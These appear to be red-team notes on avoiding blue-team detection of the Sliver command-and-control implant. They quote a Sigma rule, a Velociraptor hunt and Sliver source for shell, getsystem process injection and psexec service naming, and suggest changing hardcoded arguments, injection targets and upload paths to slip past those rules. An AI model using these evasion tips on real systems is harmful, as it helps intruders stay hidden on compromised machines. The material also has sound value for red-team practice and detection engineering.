Here are various methods blue teams are using to detect Sliver, and ideas on how to avoid that detection. 
#### Shell Sigma Rule
```yml
<SNIP>
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: '-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8'
    condition: selection
falsepositives:
    - Unlikely
level: critical
```

Basically, Sliver's `shell` command has specific arguments hardcoded into the command.

shell_windows.go
```go
var (
    // Shell constants
    commandPrompt = []string{"C:\\Windows\\System32\\cmd.exe"}
    powerShell    = []string{
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "-NoExit",
        "-Command", "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8",
    }
)
```
So if we modify this, we can potentially avoid detection (at least via that sigma rule)
#### Getsystem
By default, `getsystem` command will inject itself into the `spoolsv.exe` process. This is highly monitored.

If we inject into `svchost.exe` instead, it won't get detected by the same way, but it will get detected based on SeDebugPrivilege assigned to the process (sysmon).

priv_windows.go
```bash
// GetSystem starts a new RemoteTask in a SYSTEM owned process
func GetSystem(data []byte, hostingProcess string) (err error) {
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()
    procs, _ := ps.Processes()
    for _, p := range procs {
        if p.Executable() == hostingProcess {
            err = SePrivEnable("SeDebugPrivilege")
            if err != nil {
                // {{if .Config.Debug}}
                log.Println("SePrivEnable failed:", err)
                // {{end}}
                return
            }
            err = taskrunner.RemoteTask(p.Pid(), data, false)
            if err != nil {
                // {{if .Config.Debug}}
                log.Println("RemoteTask failed:", err)
                // {{end}}
                return
            }
            break
        }
    }
    return
}
```

Also, `getsystem` uses API calls which are monitored, such as `CreateRemoteThreadApiCall`.
#### PsExec
A psexec.go downside is that the implant name generated is based on the implant we generate earlier. 

Example Velociraptor detection
```
<SNIP>

sources:
  - name: Sliver PsExec - Services Registry Key
    query: |
        SELECT * FROM Artifact.Windows.System.Services() 
        WHERE Name =~ "^Sliver" or 
              DisplayName =~ "^Sliver" or 
              Description =~ "Sliver implant" or 
              PathName =~ ":\\\\Windows\\\\Temp\\\\[a-zA-Z0-9]{10}\\.exe"

  - name: Sliver PsExec - Service Installed Event Log
    query: |
        SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(PathRegex="System.evtx",IdRegex="^7045$")
        WHERE EventData.ServiceName =~ "^Sliver$" or 
             EventData.ImagePath =~ ":\\\\Windows\\\\Temp\\\\[a-zA-Z0-9]{10}\\.exe"
```
Basically checking for 10 ascii characters consecutively in windows\temp... Also event code `7045` is being checked corresponding to new service install.

sliver.go
```go
sliver.AddCommand(psExecCmd)
        Flags("", false, psExecCmd, func(f *pflag.FlagSet) {
            f.StringP("service-name", "s", "Sliver", "name that will be used to register the service")
            f.StringP("service-description", "d", "Sliver implant", "description of the service")
            f.StringP("profile", "p", "", "profile to use for service binary")
            f.StringP("binpath", "b", "c:\\windows\\temp", "directory to which the executable will be uploaded")
            f.StringP("custom-exe", "c", "", "custom service executable to use instead of generating a new Sliver")

            f.Int64P("timeout", "t", defaultTimeout, "grpc timeout in seconds")
        })
        FlagComps(psExecCmd, func(comp *carapace.ActionMap) {
            (*comp)["custom-exe"] = carapace.ActionFiles()
        })
        carapace.Gen(psExecCmd).PositionalCompletion(carapace.ActionValues().Usage("hostname (required)"))
```
This shows options we can specify when using psexec.

psexec.go -- shows how name is created.
```go
func randomString() string {
    alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
    str := ""
    for index := 0; index < insecureRand.Intn(8)+1; index++ {
        str += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
    }
    return str
}

func randomFileName() string {
    noun := randomString()
    noun = strings.ToLower(noun)
    switch insecureRand.Intn(3) {
    case 0:
        noun = strings.ToUpper(noun)
    case 1:
        noun = strings.ToTitle(noun)
    }

    separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
    sep := separators[insecureRand.Intn(len(separators))]

    alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
    prefix := ""
    for index := 0; index < insecureRand.Intn(3); index++ {
        prefix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
    }
    suffix := ""
    for index := 0; index < insecureRand.Intn(6)+1; index++ {
        suffix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
    }

    return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
}
```

> TLDR: If we utilize `--binpath` / `-b`, we can specify a different directory and avoid detection using `psexec`.
